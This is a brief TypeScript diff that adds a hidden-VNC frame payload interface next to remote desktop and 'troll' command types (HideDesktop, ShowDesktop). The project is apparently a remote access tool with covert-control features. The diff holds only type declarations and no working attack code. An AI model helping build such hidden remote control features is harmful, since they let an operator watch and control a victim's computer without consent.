@@ -220,6 +220,11 @@ export interface RemoteDesktopFramePayload {
   data: string;
 }
 
+export interface HVNCFramePayload {
+  addr: string;
+  data: string;
+}
+
 export enum TrollCommandType {
   HideDesktop = "HideDesktop",
   ShowDesktop = "ShowDesktop",
